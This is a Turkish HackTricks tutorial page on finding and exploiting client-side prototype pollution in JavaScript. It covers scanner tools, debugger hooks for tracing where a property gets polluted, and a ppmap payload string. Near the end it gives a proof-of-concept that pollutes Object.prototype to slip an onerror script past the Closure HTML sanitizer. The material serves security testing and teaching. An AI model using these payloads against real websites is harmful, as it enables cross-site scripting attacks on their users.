# İstemci Tarafı Prototype Kirliliği

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Otomatik Araçlar Kullanarak Keşfetme

[**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ve** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) araçları, **prototype kirliliği açıklarını bulmak** için kullanılabilir.

Ayrıca, **tarayıcı eklentisi** [**PPScan**](https://github.com/msrkp/PPScan) kullanarak **eriştiğiniz sayfaları otomatik olarak** **taramanız** da mümkündür.

### Bir özelliğin kullanıldığı yeri hata ayıklama <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Prototype Kirliliğinin Kök Nedenini Bulma <a href="#5530" id="5530"></a>

Herhangi bir araç tarafından bir prototype kirliliği açığı tespit edildiğinde ve kod çok karmaşık değilse, Chrome Geliştirici Araçları'nda `location.hash`, `decodeURIComponent` veya `location.search` gibi anahtar kelimeleri aratarak açığı bulabilirsiniz. Bu yaklaşım, JavaScript kodunun savunmasız bölümünü belirlemenizi sağlar.

Daha büyük ve karmaşık kod tabanları için, savunmasız kodu keşfetmek için aşağıdaki adımları izleyen basit bir yöntem kullanılır:

1. Bir araç kullanarak bir açığı tespit edin ve bir özelliği constructor içinde ayarlamak için tasarlanmış bir payload elde edin. ppmap tarafından sağlanan bir örnek şu şekilde olabilir: `constructor[prototype][ppmap]=reserved`.
2. Sayfada çalışacak olan JavaScript kodunun ilk satırında bir kesme noktası ayarlayın. Payload ile sayfayı yenileyerek, bu kesme noktasında yürütmeyi duraklatın.
3. JavaScript yürütmesi duraklatıldığında, aşağıdaki betiği JS konsolunda çalıştırın. Bu betik, 'ppmap' özelliği oluşturulduğunda sinyal verecek ve kökenini bulmada yardımcı olacaktır:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **Kaynaklar** sekmesine geri dönün ve "Script yürütmesini devam ettir" seçeneğini seçin. JavaScript yürütmeye devam edecek ve 'ppmap' özelliği beklenildiği gibi kirlenecektir. Sağlanan kod parçacığı kullanılarak 'ppmap' özelliğinin kirlendiği tam konumun tespit edilmesi kolaylaşır. **Çağrı Yığını**'nı inceleyerek, kirlenmenin meydana geldiği farklı yığınlar gözlemlenebilir.

Hangi yığını araştıracağınızı belirlerken, genellikle prototype kirlenmesinin sıkça bu kütüphanelerde meydana geldiği yığınları hedeflemek faydalı olur. Sağ tarafta (rehberlik için sağlanan bir resim gibi) kütüphane dosyalarına bağlı olan ilgili yığını belirleyerek bulun. 4. ve 6. satırlardaki gibi birden fazla yığın senaryolarında, kirlenmenin ilk meydana geldiği ve dolayısıyla zayıflığın kök nedeni olan 4. satırdaki yığın mantıklı bir seçimdir. Yığını tıklamak, zayıf kodun bulunduğu yere yönlendirecektir.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Script Gadget'larını Bulma

Gadget, bir PP zafiyeti keşfedildiğinde **istismar edilecek kod parçacığıdır**.

Uygulama basitse, **`srcdoc/innerHTML/iframe/createElement`** gibi **anahtar kelimeleri arayabiliriz** ve kaynak kodunu inceleyerek **javascript yürütmesine yol açıp açmadığını** kontrol edebiliriz. Bazen, bahsi geçen teknikler hiç gadget bulamayabilir. Bu durumda, saf kaynak kod incelemesi aşağıdaki örnekte olduğu gibi bazı güzel gadget'ları ortaya çıkarır.

### Mithil kütüphane kodunda PP gadget'ını bulma örneği

Bu yazıya göz atın: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Hassas kütüphaneler için payload'ların yeniden derlenmesi

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP ile HTML Temizleyicilerin atlatılması

[**Bu araştırma**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) bazı HTML temizleyici kütüphaneler tarafından sağlanan temizlemeleri atlatmak için kullanılabilecek PP gadget'larını göstermektedir:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### Closure
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referanslar

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
